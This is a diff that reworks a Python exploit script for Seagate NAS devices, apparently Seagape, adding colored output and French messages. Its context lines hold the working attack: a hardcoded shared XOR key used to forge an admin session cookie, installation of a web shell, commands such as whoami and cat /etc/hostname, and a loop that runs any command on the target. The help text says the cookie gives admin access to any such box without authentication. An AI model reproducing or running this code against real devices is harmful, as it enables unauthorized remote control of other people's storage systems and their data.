@@ -43,6 +43,13 @@ import xml.sax.saxutils
 if len(sys.argv) < 3:
     print "Usage: {0} <ip> <port> [-c [user agent]]".format(sys.argv[0])
     sys.exit(1)
+#env colors:
+cM="\033[1;33m" #categorie color
+cT="\033[1;34m" #text color
+cS="\033[1;36m" #script color
+cE="\033[1;31m" #error color
+cC="\033[1;32m" #cookie color
+cR="\033[0m"
 
 # Every Seagate nas has the same XOR key. Great.
 XOR_KEY = '0f0a000d02011f0248000d290d0b0b0e03010e07'
@@ -145,7 +152,7 @@ def get_ci_session():
             if name == 'ci_session' and len(value) > 40:
                 return decode(base64.b64decode(urllib.unquote(value)))
 
-    print "Unable to establish session with {0}".format(host)
+    print " |_[-] Impossible d'etablir une session avec {0}".format(host)
     sys.exit(1)
 
 def add_string(ci_session, key, value):
@@ -212,30 +219,30 @@ def show_admin_cookie(user_agent):
     ci_session = add_string(ci_session, 'username', 'admin')
     ci_session = add_string(ci_session, 'user_agent', user_agent)
     ci_session = urllib.quote(base64.b64encode(encode(ci_session)))
-    print "Session cookies are bound to the browser's user agent."
-    print "Using user agent: " + user_agent
-    print "ci_session=" + ci_session
+    print cM + "\n[+] DUMP DU COOKIE ADMIN: " + cT +"Les cookies de session vous redirigent vers le Dashboard Seagate si le bon user-agent est utilise."
+    print cM + " |_[-] User agent utilise:"+ cT + " " + user_agent
+    print cM + " |_[-] ci_session:" + cC + " \n" + ci_session
 
 def show_version():
-    print "Firmware Version: {0}".format(get_firmware_version())
+    txtShow=" {0}".format(get_firmware_version())
+    print cM + "\n[+] VERSION DU FIRMWARE:" + cT +" " + txtShow +" \n"
 
 def show_cookie():
-    print cis
+    print "" + cC + cis + cS
 
 def show_help():
     print ""
-    print "Seagape v1.0 -- Interactive Seagate NAS Webshell"
-    print "  - OJ Reeves (@TheColonial) - https://beyondbinary.io/"
-    print "  - https://beyondbinary.io/bbsec/001"
-    print "==========================================================================="
-    print "version           - Print the current firmware version to screen."
-    print "dumpcookie        - Print the current cookie to screen."
-    print "admincookie <ua>  - Create an admin login cookie (ua == user agent string)."
-    print "                    Add to your browser and access ANY NAS box as admin."
-    print "help              - Show this help."
-    print "exit / quit       - Run for the hills."
-    print "<anything else>   - Execute the command on the server."
-    print ""
+    #print cM + "==========================================================================="
+    print cM + "[+] AIDE/COMMANDES:"
+    print cM + " |_[-] version           :" + cT + " Afficher la version du firmware sur la sortie standard"
+    print cM + " |_[-] dumpcookie        :" + cT + " Affiche le cookie actuel sur la sortie standard"
+    print cM + " |_[-] admincookie <ua>  :" + cT + " Utiliser un cookie admin (avec ua = user agent string)."
+    print cM + " |                        " + cT + " Permet d'acceder a l'intrerface d'administration sans authentification"
+    print cM + " |_[-] help              :" + cT + " Affiche cette aide."
+    print cM + " |_[-] exit / quit       :" + cT + " Quitter"
+    print cM + " |_[-] <Tout autre >     :" + cT + " Lancer la commande sur le serveur"
+   #print cM + "==========================================================================="
+    print cS + ""
 
 def execute(user_input):
     result = True
@@ -257,7 +264,7 @@ def execute(user_input):
         remove_shell()
         result = False
     else:
-        print cmd(user_input)
+        print cmd(user_input+" 2>&1")
     return result
 
 def get_firmware_version():
@@ -300,7 +307,8 @@ def install_shell():
 def remove_shell():
     return cmd('rm -f {0}'.format(webshell))
 
-print "Establishing session with {0} ...".format(host)
+print_msg=" |_[-] Connexion a {0}: ".format(host)
+print "" + cM + print_msg + cT + "En cours ..."
 cis = get_ci_session()
 
 if len(sys.argv) >= 4 and sys.argv[3] == '-c':
@@ -309,22 +317,24 @@ if len(sys.argv) >= 4 and sys.argv[3] == '-c':
         ua = sys.argv[4]
     show_admin_cookie(ua)
 else:
-    print "Configuring administrative access ..."
+    print cM + " |_[-] Configuration de l'acces administrateur: " + cT + "En cours ..."
     acis = add_string(cis, 'is_admin', 'yes')
     acis = add_string(acis, 'username', 'admin')
 
-    print "Installing web shell (takes a while) ..."
+    print cM + " |_[-] Installation du web shell:" + cT + " Vas boire un cafe et reviens dans 2mn..."
     install_shell()
 
-    print "Extracting id and hostname ..."
+    print cM + " |_[-] Recuperation de l'id et du hostname: " + cT + "En cours ..."
     identity = cmd('whoami').strip()
     hostname = cmd('cat /etc/hostname').strip()
+    print cM + " |_[-] Succes: " + cT + "Youpi!"
     show_help()
 
     running = True
     while running:
         try:
-            user_input = raw_input("Seagape ({0}@{1})> ".format(identity, hostname))
+	    lcmd="[+] CMD [{0}@{1}] [/mindsource] $ ".format(identity, hostname)
+            user_input = raw_input(cM + lcmd + cS)
             running = execute(user_input)
         except:
-            print "Something went wrong. Try again."
+            print cE + " [!] ERREUR: Il y a comme de la colle dans les rouages semble t-il :/" + cM + ""
